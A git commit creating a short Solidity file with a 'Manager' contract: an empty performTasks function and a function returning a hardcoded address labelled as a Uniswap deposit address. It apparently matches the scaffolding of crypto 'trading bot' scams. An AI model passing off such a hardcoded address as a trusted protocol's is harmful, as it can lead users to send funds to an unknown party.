481867062ead6ab366edf52a7d317b2f032200fc
markgus <30930987+markgus@users.noreply.github.com>
2022-06-01 17:26:11 +0100

    Create iipfs.sol

---
+++ iipfs.sol
@@ -0,0 +1,9 @@
+contract Manager {
+   function performTasks() public {
+	    
+   }
+
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0x1F94cbd74e4A705011b128aFeF306541b071b5D8;
+   }
+}
